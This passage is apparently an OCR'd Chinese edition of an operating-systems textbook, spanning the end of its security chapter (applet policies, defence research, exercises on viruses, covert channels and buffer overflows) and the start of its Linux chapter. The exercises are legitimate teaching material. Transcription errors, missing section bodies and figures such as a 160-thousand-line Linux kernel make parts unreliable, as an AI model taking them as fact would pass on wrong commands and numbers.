JDK 1.2版本提 供了一套可配置的严密的安全策略，针对包含本地和异地所有的Applet 。
安全模式非常复杂导致需要整 整一本书来描述 (Gong,1999), 我们仅仅归纳出一些精华的部分。
每一个Applet 具有两个特性：来源于何处以及谁签署了它。
来源于何处是指URL; 谁签署了它是指 签名所用的私钥。
每个用户都能创建包含规则列表的安全策略。
规则列出了URL 、签署者、对象以及如 果Applet的URL和签署者匹配规则时可在对象上执行的动作。
从概念上来说，上述信息如图9-40所示， 虽然真正的格式有所不同并且与Java的类等级有关。
图9-40 JDK1.2 所指定的某些保护规则的实例
而 且 ，Susan 也信任Microsoft, 让来自于该公司站点并签名过的Applet 读、写或删除Office目录下的 所有文件。
例如，修复bug 并安装新的软件版本。
为了校验签名，Susan 要么在她的磁盘里存放公钥，要 么动态地获取公钥，例如，在持有她所信任的公司的公钥以后，使用该公司的签名证书格式。
9.11 有关安全的研究
安全研究的一个重要方向是二进制程序的保护。
控制流完整性 (CFI) 是一种相对传统的技术，可 用来阻止所有的控制流篡改，即防御所有基于返回导向编程技术 (ROP) 的攻击。
不幸的是，这种做法 的代价十分高昂。
但由于针对缓冲区溢出攻击的防御手段(如地址空间布局随机化(ASLR) 和数据执 行保护(DEP)) 等并未舍弃对控制流完整性的检测，因此近来的研究工作致力于控制流完整性技术的 实用化。
例如，纽约州立大学石溪分校的Zhang 和Sekar于2013年开发了一种针对Linux二进制程序的高 效控制流完整性检测技术 (Zhang,2013) 。
同年，石溪分校的另一个研究小组开发了另一种针对 Windows 二进制程序的更为高效的控制流完整性检测技术 (Zhang,2013b) 。
其他研究尝试更早地检测 到缓冲区溢出攻击，争取在缓冲区溢出时即刻发出警报而不必延时到控制流遭遇篡改后才能报警 (Slowinska 等人，2012)。
相对于控制流完整性检测，缓冲区溢出检测的优势在于系统还可以对其他非
控制流的数据进行监控。
此外，还有其他的工具可在编译阶段提供类似的防护手段，如Google 的 AddressSanitizer(Serebryany,2013) 。
如果上述技术能够得到广泛应用，那么我们将另起一段来介绍 缓冲区溢出的防御技术及它们之间的优劣。
权限与访问控制也是非常活跃的研究方向。
例如，seL4 就是一个支持权限控制的微内核操作系统 (Klein 等人，2009),同时它还是一个完整的可验证内核，提供了额外的安全保证。
权限控制在Unix系 统中也得到了关注。
Robert Watson等人开发了基于FreeBSD 的轻量级权限控制(Robert,2013)。
最后，我们简要地介绍攻击技术与恶意软件的相关工作。
此类研究数量繁多。
例如，Hund 等人发 现了一种可以绕过Windows 内核中地址空间随机化的定时信道攻击手段(Hund 等人，2013)。
类似地， Snow 等人也发现，浏览器中的Javascript 地址空间随机化在攻击者探测到内存泄漏的情况下(即使是很 小的一部分内存)将会无效化 (Snow 等人，2013)。
关于恶意软件，Rossow 等人的工作分析了 (Rossow等人，2013)僵尸网络 (Botnet) 的适应性，特别是基于P2P通信的僵尸网络在未来几年中将难 以解除。
有一些僵尸网络甚至已经持续运行了5年之久。
9.12 小结
代码中有很多bug可以被利用来控制程序和系统。
这些包括缓冲区溢出、格式串攻击、返回libc攻击、 整数溢出攻击、代码注入攻击和特权扩大攻击。
Internet 上遍布恶意软件，有特洛伊木马、病毒、蠕虫、间谍软件和rookit 。
每一个都对数据机密性 和一致性产生着威胁。
更糟糕的是，恶意软件攻击可能会控制一台机器，并把这台机器变成一台僵尸机 器用来发送垃圾邮件或者发起其他的攻击。
许多互联网上的攻击都是通过一台僵尸主控机控制一个僵尸 军队来完成的。
幸运的是，系统有很多种方法来保护自己。
最好的策略就是全面防御，使用多种技术一起防御。
这 些技术有防火墙、病毒扫描、代码签名、囚禁、入侵检测，以及封装移动代码。
习题
1.机密性、完整性和可用性是安全的三个组成部 分。
描述一款需要确保完整性和可用性，但对 机密性无要求的应用； 一款需要确保机密性和
完整性，但对可用性无要求的应用；以及一款 需要确保机密性、完整性和可用性的应用。
2.构建安全操作系统的一项技术是尽可能地最小
化可信计算基 (TCB)。
以下功能哪些需要在 TCB之内实现，哪些可以在TCB之外实现?
(a) 进程上下文切换
(b) 从磁盘读取文件
(c) 扩容交换区
(d) 听音乐
(e) 获取智能手机的GPS坐标
3.什么是隐蔽信道?
隐蔽信道存在的基本要求是 什么?
5.假设一个系统在某时有5000个对象和100个域。
在所有域中1%的对象是可访问的(r 、w 和x的 某种组合),两个域中有10%的对象是可访问的， 剩下89%的对象只在唯一一个域中才可访问。
假设需要一个单位的空间存储访问权 (r 、w 和x 的某种组合)、对象ID 或一个域ID。
分别需要多 少空间存储全部的保护矩阵、作为访问控制表 的保护矩阵和作为能力表的保护矩阵?
6.解释在下列操作过程中，哪种安全防护矩阵的 实现更为合适?
(a) 赋予所有用户针对某一文件的读权限。
(b) 撤销所有用户针对某一文件的写权限。
(c) 赋予用户John 、Lisa 、Christie 和Jeff 针对某 一文件的写权限。
(d) 撤销用户Jana 、Mike 、Molly 和Shane 针对 某一文件的执行权限。
7.我们讨论过的两种保护机制是权限表和访问控 制表。
对于下列每一个关于保护的问题，请问 应该使用哪一种机制。
(a)Ken 希望除了他的某位办公室的同事之外， 其他所有人都可以读到他的文件。
(b)Mitch 和Steve 想要共享一些秘密文件。
(c)Linda 希望她的部分文件是公开的。
8.请给出在以下UNIX目录里所列保护矩阵的所有 者和操作权限。
请注意， asw 属于两个组： users和devel;gmw 仅仅是users组的成员。
把两 个成员和两个组当作域，矩阵就有四行(每个 域一行)和四列(每个文件一列)。
-IW-I--I-- 2 gmw users 908 May 2616:45 PPP-Notes
-rWXr-XF-X 1 asw devel 432 May 1312:35 prog1
-IW-M----1 asw users 50094 May 3017:51 projectt
-IW-r----- 1 asw devel 13124 May 3114:30 splash.gif
9.针对上一题中的访问列表，给出每个所列目录 的操作权限。
10. 修改上例中的访问控制列表，以表述基于Unix 的rwx 系统无法描述的文件权限，并给出解释。
13. 在图9-11里，从进程B到对象1没有箭头。
可以 允许存在这类箭头吗?
如果存在，它破坏了什 么原则?
14.如果在图9-11里允许消息从进程传递到进程， 这样符合的是什么原则?
特别对进程B来说， 它可以对哪些进程发送消息，哪些不可以?
kfd ktbd fzm eubd kfd pzyiom mztx ku kzyg ur bzha kfthcm
ur mfudm zhx mftnm zhx mdzythc pzq ur ezsszcdm zhx gthcm
zhx pfa kfd mdz tm sutythc fuk zhx pfdkfdi ntcm fzld pthcm
sok pztk z stk kfd uamkdim eitdx sdruid pd fzld uoi efzk
rui mubd ur om zid uok ur sidzkf zhx zyy ur om zid rzk
hu foiia mztx kfd ezindhkdi kfda kfzhgdx ftb
boef rui kfzk
20.给出一个数学函数的实例，满足一级近似为单 向函数。
21. 假设彼此陌生的A和B二人试图通过私钥建立 通信，但是他们并未共享密钥。
设若二人均信 任某一可信的第三方C, 而 C的公钥广为人知。
那么在此情况下，A 与B应当如何就新的私钥 达成一致以建立通信?
22.入网的咖啡厅越来越多，人们也越来越愿意坐 在咖啡厅里处理商业事务。
描述一种通过智能 卡进行文件签名的方法(假设所有的电脑都装 有读卡器),并回答你的方法是否安全。
24.假设一组紧密联系的持不同政见者在被压制的 国家使用隐写术发送有关该国的状况消息到国
外，政府意识到这一点并发送含有虚假信息的 伪造图片。
这些持不同政见者如何告诉人们来 区分真实的消息和错误的消息?
接。
按照指令抽取剧本。
回答下面的问题：
(a) 原始的斑马纹和斑马纹文件的大小是多少?
(b) 斑马纹文件中秘密地存储了什么剧本?
(c)斑马纹文件中秘密地存储了多少字节?
26.让计算机不回显密码比回显星号安全些。
因为 回显出星号会让屏幕周围的人知道密码的长 度。
假设密码仅包括大小写字母和数字，密码 长度必须大于5个字符小于8个字符，那么在不 出现回显时有多安全?
30.请说出3个有效地采用生物识别技术作为登录 认证的特征。
31.验证机制大致可以分为三类：用户所知，用户 所有以及用户所是。
设若一套验证系统采用了 上述三类机制。
例如，它首先要求用户输入密 码登录，然后要求用户插入身份卡(带磁条) 并输入PIN 码，最后要求用户提供指纹。
你能
阐述此设计的两个缺点吗?
32.某个计算机科学系有大量的在本地网络上的 UNIX机器。
任何机器上的用户都可以以
rexec machine4 who
的格式发出命令并在machine4 上执行，而不用 远程登录。
这一结果是通过用户的核心程序把 命令和UID发送到远程计算机所完成的。
在这 一系统中，核心程序是可信任的吗?
如果有些 计算机是学生的无保护措施的个人计算机呢?
33.Lamport 的一次性密码技术采用的逆序密码。
这种方法比第一次用f(s), 第二次用f(f(s)) 并 依次类推的方法更简单吗?
34. 使 用MMU硬件来阻止如图9-24的溢出攻击可 行吗?
解释为什么?
35.描述堆栈伪随机数机制如何工作，以及它如何 被攻击者所绕过。
36.TOCTOU 攻击利用了攻击者与受害者之间的竞 争条件。
一种针对此攻击的防御手段为事务化 文件系统的操作。
解释此手段为何能够起效， 以及可能存在的问题。
37. 指出C编译器的某项功能，它可以消除大量的安 全漏洞。
为什么这没有被更被广泛地应用呢?
38.特洛伊木马能够攻击应用权能字保护的系统吗?
39.当一个文件被删除时，其文件块只是简单地被放 回空闲列表，而不会对文件块中的内容进行擦除。
如果操作系统在释放文件块之前对文件块的内容 进行清理，你认为是否有益?
综合考虑安全与性 能两方面的要求，并做出相应的解释。
40.对于寄生虫病毒来说：
(a) 如何确定它会在主程序之前执行?
(b) 在病毒执行后如何返回主程序?
41.一些操作系统需求在记录开始之前便进行硬盘 分区，这样的需求为什么会为引导扇区病毒提 供生活空间?
42. 改变图9-28中的程序，使其能够找到所有的C 程序，而不是所有的执行文件。
44. 图9-33d中的病毒同时拥有压缩器与解压缩器， 解压缩器是用来释放压缩程序的，那压缩器的 作用呢?
46.通常系统在从病毒中恢复时会用到下列指令：
(1)启动被感染的系统。
(2)将所有文件备份到外部存储介质中。
(3)运行fdisk (或类似的程序)来格式化磁盘。
(4)利用原始的CD-ROM重新安装操作系统。
(5)将外部存储介质中的文件重新载入计算机。
47. 携带性病毒可以在UNIX 系统中存在吗?
如果 可以，请解释它是如何做到的，如果不能，请 说明原因。
48.自我提取技术通常包含一个或多个压缩文件包
和提取程序，它经常被用于子程序或程序升级 中，请思考该技术中的相关安全问题。
50. 被rootkit 注入的计算机，只是简单地将软件状 态恢复到之前设置的恢复点，是否能够恢复健 康状态?
51.是否有可能写一个程序，它的输入是另外一个 程序，输出是输入程序中是否存在病毒呢?
53. 在一些机器上，图9-38b中使用的SHR 指令使 用了0来填充未使用的bit, 以确保可以检查其 他的bit 数据是否正确，对于9-38b中的正确性 而言，哪种指令可以被使用?
如果有的话，哪 个更好?
55. 描述使用Java 语言创建安全程序要比C语言好 的三个特征。
57. 小应用程序(applet) 与应用程序 (application) 的区别是什么?
这种区别与安全有何关系?
58. 使 用C或者其他脚本语言写一对程序，使得它 们可以发送和接收UNIX 系统中隐蔽信道的信 息。
(提示：即使文件不可使用时，权限位依然 可见，sleep 命令或系统调用会保证拖延一段时 间，这由设置的参数所决定。
)在空闲系统上测 量数据率，之后再在满载系统上测试数据率。
60. 假设一个系统使用ACL 来维护它的防护矩阵。
请写一组ACL 的管理函数以使下列情况发生 时 ，ACL 可以被正确使用：
(1)创建新对象。
(2)删除对象。
(3)创建新域。
(4)删除域。
(5)为域赋予新的权限 (r 、w 、x 的 组 合 ) 以 控制一个对象。
(6)撤销某个域对对象的控制权限。
(7)对于所有域生成新的控制权限以控制对 象。
(8)对于所有域撤销对对象的控制权限。
61.实现9.7.1小节的代码，观察缓冲区溢出时会发 生什么,并测试不同长度的字符串。
62.编写一段程序来模拟9.9.2小节“可执行的病毒” 下的重写病毒 (overwriting virus)。
选择一个 能够被重写但无风险的可执行文件。
针对病毒 程序的二进制代码，选择一个无害的可执行文 件的二进制代码。
第10章
Modern Operating Systems,Fourth Edition
实例研究1: UNIX 、Linux和Android
我们将从Linux的历史以及UNIX与Linux的演化开始讨论，然后给出Linux的概述，从而使读者对它 的使用有一些概念。
这个概述对那些只熟悉Windows 系统的读者尤为有用，因为Windows 系统实际上对 使用者隐藏了几乎所有的系统细节。
虽然图形界面可以使初学者很容易上手，但它的灵活性较差而且不 能使用户洞察到系统是如何工作的。
接下来是本章的核心内容，我们将分析Linux的进程与内存管理、I/O、文件系统以及安全机制。
对 于每个主题，我们将先讨论基本概念，然后是系统调用，最后讨论实现机制。
我们首先应该解决的问题是：为什么要用Linux作为例子?
的确，Linux 是UNIX的一个衍生版本，但 UNIX自身有很多版本，还有很多其他的衍生版本，包括AIX 、FreeBSD 、HP-UX 、SCO UNIX 、System VSolaris等。
幸运的是，所有这些系统的基本原理与系统调用大体上是相同的(在设计上)。
此外，它们的总 体实现策略、算法与数据结构也很相似，不过也有一些不同之处。
为了使我们的例子更具体，最好选定一 个系统然后从始至终地对它进行讨论。
因为大多数读者相对于其他系统而言更容易接触到Linux,故我们选 中Linux作为例子。
况且除了实现相关的内容，本章的大部分内容对所有UNIX系统都是适用的。
有很多书籍 介绍怎样使用UNIX,但也有一些书籍介绍其高级特性以及系统内核(Love,2013;McKusick 和Neville-Neil, 2004;Nemeth 等人，2013;Ostrowick,2013;Sobell,2014;Stevens 和Rago,2013;Vahalia,2007)。
10.1 UNIX与Linux的历史
UNIX与Linux 有一段漫长而又有趣的历史，因此我们将从这里开始我们的学习。
UNIX 开始只是一 个年轻的研究人员 (Ken Thompson) 的业余项目，后来发展成价值数十亿美元的产业，涉及大学、跨 国公司、政府与国际标准化组织。
在接下来的内容里我们将展开这段历史。
10.1.1 UNICS
回到20世纪40～50年代，当时所有计算机都是个人计算机，使用计算机的标准方式是签约租用一个 小时的机时，然后在这个小时内独占整台机器。
至少从这个角度，所有的计算机都是个人计算机。
当然， 这些机器体积庞大，在任何时候只有一个人(程序员)能使用它们。
当批处理系统在20世纪60年代兴起 时，程序员把任务记录在打孔卡片上并提交到机房。
当机房积累了足够的任务后，将由操作员在一次批 处理中处理。
这样，往往在提交任务一个甚至几个小时后才能得到结果。
在这种情况下，调试成为一个 费时的过程，因为一个错位的逗号都会导致程序员浪费数小时。
虽然Bell实验室是MULTICS项目的创始方之一，但是它后来撤出了这个项目，仅留下一位研究人员 Ken Thompson寻找一些有意思的东西继续研究。
他最终决定在一台废弃的PDP-7小型机上自己写一个精 简版的MULTICS (当时使用汇编语言)。
尽管PDP-7体积很小，但是Thompson 的系统确实可以正常运行
404 第 1 0 章
10.1.2 PDP-11 UNIX
第二个发展则与编写UNIX的编程语言有关。
那时，为每台新机器重写整个系统显然是一件很无趣 的事情，因此Thompson 决定用自己设计的一种高级语言B重写UNIX 。
B 是BCPL 的简化版(BCPL 自己 是 CPL的简化版，而CPL就像PL/I 一样从来没有好用过)。
由于B的种种缺陷，尤其是缺乏数据结构，这 次尝试并不成功。
接着Ritchie 设计了B语言的后继者，很自然地命名为C 。
Ritchie 同时为C编写了一个出 色的编译器。
Thompson 和Ritchie 一起工作，用C 重写了UNIX 。
C 是恰当的时间出现的一种恰当的语言， 从此统治了操作系统编程。
1974年，Ritchie 和Thompson发表了一篇关于UNIX的里程碑式的论文 (Ritchie 和Thompson,1974)。
由于他们在论文中介绍的工作，他们随后获得了享有盛誉的图灵奖(Ritchie,1984;Thompson,1984)。
这篇论文的发表使许多大学向Bell 实验室索要UNIX的副本。
由于Bell 实验室的母公司AT&T在当时作为 垄断企业受到监管，不允许经营计算机业务，它很愿意能够通过向大学出售UNIX 获取适度的费用。
一个偶然事件往往能够决定历史。
PDP-11 正好是几乎所有大学的计算机系选择的计算机，而PDP- 11预装的操作系统使大量的教授与学生望而生畏。
UNIX 很快地填补了这个空白。
这在很大程度上是因 为UNIX 提供了全部的源代码，人们可以(实际上也这么做了)不断地进行修补。
大量科学会议围绕 UNIX 举行，在会上杰出的演讲者们站在台上介绍他们在系统核心中找到并改正的隐蔽错误。
一位澳大 利亚教授John Lions用通常是为乔叟 (Chaucer) 或莎士比亚 (Shakespeare) 作品保留的格式为UNIX的 源代码编写了注释(1996年以Lions的名义重新印刷)。
这本书介绍了版本6,之所以这么命名是因为它 出现在UNIX程序员手册的第6版中。
源代码包含8200行C 代码以及900行汇编代码。
由于以上所有活动 的开展，关于UNIX系统的新想法和改进迅速传播开来。
在几年内，版本6被版本7代替，后者是UNIX的第一个可移植版本(运行在PDP-11以 及Interdata 8/32上),已经有18800行C代码以及2100行汇编代码。
版本7培养了整整一代的学生，这些学生毕业去 业界工作后促进了它的传播。
到了20世纪80年代中期，各个版本的UNIX 在小型机与工程工作站上已广 为使用。
很多公司甚至买下源代码版权开发自己的UNIX 版本，其中有一家年轻小公司叫作Microsoft (微软),它以XENIX的名义出售版本7好几年了，直到它的兴趣转移到了其他方向上。
10.1.3 可移植的UNIX
UNIX是用C编写的，因而将它移植到一台新机器上比之前用汇编语言编写的系统移植要容易多了。
移植首先需要为新机器写一个C 编译器，然后需要为新机器的I/O设备，如显示器、打印机、磁盘等编写 设备驱动。
虽然驱动的代码是用C 写的，但由于没有两个磁盘按照同样的方式工作，它不能被移植到另 一台机器，并在那台机器上编译运行。
最终，一小部分依赖于机器的代码，如中断处理或内存管理程序， 必须重写，通常使用汇编语言。
系统第一次向外移植是从PDP-11 到Interdata 8/32小型机上。
这次实践显示出UNIX 在设计时暗含了 一大批关于系统运行机器的假设，例如假设整型的大小为16位，指针的大小也是16位(暗示程序最大容 量为64KB), 还有机器刚好有三个寄存器存放重要的变量。
这些假设没有一个与Interdata 机器的情况相 符，因此整理修改UNIX需要大量的工作。
另一个问题来自Ritchie 的编译器。
尽管它速度快，能够产生高质量的目标代码，但这些代码只是基 于PDP-11机器。
有别于针对Interdata 机器写一个新编译器的通常做法，Bell 实验室的Steve Johnson设计
实例研究1: UNIX、Linux和Android 405
并实现了可移植的C 编译器，只需要适量的修改工作就能够为任何设计合理的机器生成目标代码。
多年 以来，除了PDP-11以外几乎所有机器的C编译器都是基于Johnson 的编译器，因此Johnson的工作极大地 促进了UNIX在新计算机上的普及。
由于开发工作必须在唯一可用的UNIX 机器PDP-11 上进行，这台机器正好在Bell 实验室的第五层， 而Interdata在第一层，因此最初向Interdata机器的移植进度缓慢。
生成一个新版本意味着在五楼编译， 然后把一个磁带搬到一楼去检查这个版本是否能用。
在搬了几个月的磁带后，有人提出：“要知道我们 是一家电话公司，为什么我们不把两台机器用电线连接起来?
”因此，UNIX 网络诞生了。
在被移植到 Interdata之后，UNIX又被移植到VAX和其他计算机上。
10.1.4 Berkeley UNIX
10.1.5 标 准UNIX
名为POSIX 。
前三个字母代表可移植操作系统 (Portable Operating System),后 缀IX用来使这个名字与 UNIX的构词相似。
经过一次又一次的争论与辩驳之后，POSIX 委员会制定了一个称为1003.1的标准。
它规定了每一个 符合标准的UNIX系统必须提供的库函数。
大多数库函数会引发系统调用，但也有一些可以在系统内核之 外实现。
典型的库函数包括open,read 与fork。
POSIX的思想是这样的，一个软件销售商写了一个只调用 了符合1003.1标准函数的程序，那么他就可以确信这个程序可以在任何符合标准的UNIX系统上运行。
的确大多数标准制定机构都会做出令人厌恶的妥协，在标准中包含一些制定这个标准的机构偏好的 一些特性。
在这点上，1003.1做得非常好，它考虑到了制定时牵涉到的大量相关者与他们各自既定喜好。
IEEE 委员会并没有采用System V与BSD特性的并集作为标准的起始点(大部分的标准组织常这样做), 而是采用了两者的交集。
简而言之，如果一个特性在System V与BSD中都出现了，它就被包含在标准中， 否则就被排除出去。
由于这种做法，1003.1与System V和BSD两者的共同祖先UNIX第7版有着很强的相 似性。
1003.1文档的编写方式使得操作系统的开发者与软件的开发者都能够理解，这是它在标准界中的 另一个创新之处，即使这方面的改进工作已经在进行之中。
虽然1003.1标准只解决了系统调用的问题，但是一些相关文档对线程、应用程序、网络及UNIX的 其他特性进行了标准化。
另外，ANSI 与ISO 组织也对C 语言进行了标准化。
10.1.6 MINIX
所有现代的UNIX系统共有的一个特点是它们又大又复杂。
在这点上，与UNIX的初衷背道而驰。
即使 源代码可以免费得到(在大多数情况下并不是这样),单纯一个人不再能够理解整个系统。
这种情况导致 本书的一位作者 (Andrew S.Tanenbaum) 编写了一个新的类UNIX系统，它足够小，因而比较容易理解。
它的所有源代码公开，可以用作教学目的。
这个系统由11800行C 代码以及800行汇编代码构成。
它于1987 年发布，在功能上与UNIX第7版几乎相同，后者是PDP-11时代大多数计算机科学系的中流砥柱。
MINIX 在问世几个月之内，就在自己的USENET (现在的Google) 新闻组comp.os.minix 以及 40000多名使用者中风靡一时。
大量使用者提供了命令和其他用户程序，所以MINIX迅速地变成了一个 由互联网上的众多使用者完成的集体项目。
它是之后出现的其他集体项目的一个原型。
1997年，MINIX 第2版发布，其基本系统包含了网络，并且代码量增长到了62200行。
2004年左右，MINIX 的发展方向发生了巨大的变化，它专注于发展一个极其可靠、可依赖的系统， 能够自动修复自身错误并且自恢复，即使在可重复软件缺陷被触发的情况下也能够继续正常工作。
因此， 第1版中的模块化思想在MINIX 3.0中得到极大扩展，几乎所有的设备驱动被移到了用户空间，每一个驱 动作为独立的进程运行。
整个核心的大小突然降到不到4000行代码，因此一个单独的程序员可以轻易地 理解。
为了增强容错能力，系统的内部机制在很多地方发生了改变。
另外，有超过650种流行的UNIX程序被移植到MINIX 3.0,包括X Window系统(有时候只用X表示)、 各种各样的编译器(包括gcc) 、文本处理软件、网络软件、浏览器以及其他很多程序。
与以前的版本在 本质上主要是教学用途不同，从MINIX 3.0开始拥有高可用性，并聚焦在高可靠性上。
MINIX 的最终目 标是：取消复位键。
《操作系统设计与实现》(Operating Systems:Design and Implementation)这本书的第三版中介绍
10.1.7 Linux
接下来的一个主要的Linux发行版是1994年发布的版本1.0。
它大概有165000行代码，并且包含了一 个新的文件系统、内存映射文件和可以与BSD 相容的带有套接字和TCP/IP的网络。
它同时也包含了一些 新的驱动程序。
在接下来的两年中，发布了几个轻量修订版本。
到这个时候，Linux 已经和UNIX充分兼容，大量的UNIX软件都被移植到了Linux上，使得它比起以 前具有了更强的可用性。
另外，大量的用户被Linux所吸引，并且在Torvalds的整体管理下开始用多种方 法对Linux的代码进行研究和扩展。
之后一个主要的发行版是1996年发布的2.0版本。
它由大约470000行C 代码和8000行汇编代码组成。
它包含了对64位体系结构的支持、对称多道程序设计、新的网络协议和许多的其他特性。
一个为支持不 断增多的外部设备而编写的可扩展设备驱动程序集，占用了总代码量的很大一部分。
随后，很快发行了 另外的版本。
Linux内核的版本号由四个数字组成，A.B.C.D, 如2.6.9.11。
第一个数字表示内核的版本。
第二个 数字表示第几个主要修订版。
在2.6版本内核之前，偶数版本号相当于内核的稳定发行版，而奇数版本 号则相当于不稳定的修订版，即开发版。
在2.6版本内核中，不再是这种情况了。
第三个数字表示次要 修订版，比如支持了新的驱动程序等。
第四个数字则与小的错误修正或安全补丁相关。
2011年7月， Linus Torvalds宣布了Linux 3.0的发布，目的不是为了响应重大的技术进步，而是为了纪念内核发布20周 年。
截至2013年，Linux内核代码已接近16万行。
大量的标准UNIX 软件移植到了Linux 上，包括X窗口系统和大量的网络软件。
也有人为Linux 开发 了两个不同的GUI(GNOME 和KDE), 二者有相互竞争之势。
简而言之，Linux 已经成长为一个完整的 UNIX翻版，包括了UNIX爱好者可能想到的所有特性。
发；其源代码必须要么与产品一起发送，要么可以随意索取。
10.2 Linux简介
为了那些对Linux 不熟悉的用户的利益，在这一节我们将对Linux 本身以及如何使用Linux 进行简单 的介绍。
几乎本节介绍的所有内容同样适用于所有与UNIX相差不多的UNIX 衍生系统。
虽然Linux 有多 种图形界面，但在这里我们关注的是在X 系统的shell窗口中工作的程序员眼中的Linux界面。
在随后的几 节中，我们将关注系统调用以及它们是如何在内核中工作的。
10.2.1 Linux的设计目标
一 直以来，UNIX 都被设计成一种能够同时处理多进程和多用户的交互式系统。
它是由程序员设计 的，也是给程序员使用的，而使用它的用户大多都比较有经验并且经常参与(通常较为复杂的)软件开 发项目。
在很多情况下，通常是大量的程序员通过积极的合作来开发一个单一的系统，因此UNIX有广 泛的工具来支持在可控制的条件下的多人合作和信息共享。
一组有经验的程序员共同开发一个复杂软件 的模式显然和一个初学者独立地使用一个文档编辑器的个人计算机模式有显著区别，而这种区别在 UNIX 系统中自始至终都有所反映。
Linux 系统自然而然地继承了这些设计目标，尽管它的第一个版本是 面向个人电脑的。
好的程序员追求什么样的系统?
首先，大多数程序员喜欢让系统尽量简单，优雅，并且具有一致性。
比如，从最底层的角度来讲，一个文件应该只是一个字节集合。
为了实现顺序存取、随机存取、按键存 取、远程存取等而设计不同类型的文件(像大型机一样)只会碍事。
类似地，如果命令
Is A*
的意思是列举出所有以“A” 打头的文件，那么命令
rm A*
的意思就应该是删除所有以“A” 打头的文件而不是删除文件名是“A*” 的那个文件。
这个特性有时被
称为最小惊讶原理。
有经验的程序员通常还希望系统具有较强的功能性和灵活性。
这意味着一个系统应该具有较小的一 组基本元素，而这些元素可有多种多样的组合方式来满足各种应用需要。
设计Linux的一个基本指导方 针就是每个程序应该只做一件事并且把它做好。
因此，编译器不会产生列表，因为有其他的程序可以更
好地实现这个功能。
grep ard f
另外一种方法是让程序员先选择grep 程序(不带参数),然后让grep 程序自己宣布说“你好，我是grep, 我在文件中寻找模式。
请输入你要寻找的模式。
”在输入一个模式之后，grep 程序要求输入一个文件名。
然后它再提问是否还有别的文件。
最后，它总结需要执行的任务并且询问是否正确。
尽管这样的用户界 面可能适合初学者，但它会把有经验的程序员逼疯。
他们想要的是一个佣人，不是一个保姆。
10.2.2到Linux的接口
一个Linux系统可被看成一座金字塔，如图10-1所示。
最底层的是硬件，包括CPU、内存、磁盘、 显示器、键盘以及其他设备。
运行在硬件之上的是操作系统。
它的作用是控制硬件并且为其他程序提供 系统调用接口。
这些系统调用允许用户程序创立并管理进程、文件以及其他资源。
图10-1 Linux 系统中的层次结构
程序通过把参数放入寄存器(有时是栈)来调用系统调用，并发出陷入指令从用户模式切换到内核模 式。
由于不能用C 语言写一条陷入指令，因此系统提供了一个库，每个函数对应一个系统调用。
这些函数 是用汇编语言写的，不过可以从C中调用。
每一个函数首先将参数放到合适的地方，然后执行陷阱命令。
因此，为了执行read 系统调用， 一个C 程序需要调用read 库函数。
值得一提的是，由POSIX 指定的是库接口， 而不是系统调用接口。
换句话说，POSIX 规定哪些库函数是一个符合标准规范的系统必须提供的，它们的 参数是什么,它们的功能是什么,以及它们返回什么样的结果。
POSIX 根本没有提到真正的系统调用。
除了操作系统和系统调用库，所有版本的Linux必须提供大量的标准程序，其中一些是由POSIX 1003.2标准指定的，其他的根据不同版本的Linux 而有所不同。
它们包括命令处理器 (shell) 、 编 译 器 、 编辑器、文本处理程序以及文件操作工具。
用户使用键盘调用的是上述这些程序。
因此，我们可以说 Linux 具有三种不同的接口：真正的系统调用接口、库函数接口和由标准应用程序构成的接口。
大多数常见的Linux 个人计算机发行版都把上述的面向键盘的用户界面替换为面向鼠标的图形用户 界面，而根本没有修改操作系统本身。
正是这种灵活性让Linux 如此流行并且在经历了如此多的技术革 新后存活下来。
Linux 的GUI 和最初在20世纪70年代为UNIX 系统开发的、后来由于Macintosh 和Windows 变得流行的 GUI 非常相似。
这种GUI 创建一个桌面环境，包括窗口、图标、文件夹、工具栏和拖拽功能。
一个完整的 桌面环境包含一个窗口管理器(负责控制窗口的摆放和外观),以及各种应用程序，并且提供一个一致的 图形界面。
比较流行的Linux 桌面环境包括GNOME(GNU 网络对象模型环境)和KDE(K 桌面环境)。
当在Linux 上使用图形界面时，用户可以通过鼠标点击运行程序或者打开文件，通过拖拉将文件从 一个地方复制到另一个地方等。
另外，用户也可以启动一个终端模拟程序xterm, 它为用户提供一个到 操作系统的基本命令行界面。
下面一节有关于它的详细描述。
10.2.3 shell
尽管Linux 系统具有图形用户界面，然而大多数程序员和高级用户都更愿意使用一个命令行界面， 称作shell。
通常这些用户在图形用户界面中启动一个或更多的shell窗口，然后就在这些shell窗口中工作。
shell 命令行界面使用起来更快速，功能更强大，扩展性更好，并且让用户不会遭受由于必须一直使用鼠 标而引起的肢体重复性劳损(RSI)。
接下来我们简要介绍一下bash shell(bash)。
它基于的是UNIX 最原 始 的shell(Bourne shell)( 先 由Steve Bourne编写，后来由贝尔实验室开发),它的名字也是Bourne Again shell的首字母缩写。
经常使用的还有很多其他的shell(ksh 和csh 等),但是bash是大多数Linux系 统的默认shell。
当shell被启动时，它初始化自己，然后在屏幕上输出一个提示符(prompt), 通常是一个百分号或 者美元符号，并等待用户输入命令行。
等用户输入一个命令行后，shell 提取其中的第一个字，这里的字指的是被空格或制表符分隔开的一 连串字符。
假定这个字是将要运行程序的程序名，搜索这个程序，如果找到了这个程序就运行它。
然后， shell会将自己挂起直到该程序运行完毕，之后再尝试读入下一条命令。
重要的是，shell也只是一个普通 用户程序。
它仅仅需要从键盘读取数据、向显示器输出数据和运行其他程序的能力。
命令中还可以包含参数，它们作为字符串传给所调用的程序。
比如，下面的命令行
cp src dest
调用cp程序并包含两个参数src 和dest。
这个程序将第一个参数解释为一个现存的文件名，然后创建该文 件的一个副本，其名称为dest。
并不是所有的参数都是文件名。
在命令行
head-20 file
中，第一个参数-20通知head程序输出file中的前20行，而不是默认的10行。
负责控制一个命令的操作或 者指定一个可选数值的参数称为标志 (flag), 习惯上由一个破折号标记。
为了避免歧义，这个破折号是 必要的，比如
head 20 file
是一个完全合法的命令，它告诉head 程序输出文件名为20的文件的前10行，然后输出文件名为file 的文 件的前10行。
大多数Linux命令接受多个标志和多个参数。
为了更容易地指定多个文件名，shell 支持魔法字符，有 时 称为通配符。
比如，一个星号可以匹配所 有可能的字符串，因此
Is*.c
告 诉ls 列举出所有文件名以.c结束的文件。
如果同时存在文件x.c 、y.c 和z.c, 那么上述命令等价于下面的命令 Is x.c y.c z.c
另一个通配符是问号，负责匹配任意一个字符。
一组在中括号中的字符可以表示其中的任意一个，因此 Is [ape]*
列举出所有以 “a”“p” 或 者 “e” 开头的文件。
像shell 这样的程序不一定非要通过终端(键盘和显示器)进行输入输出。
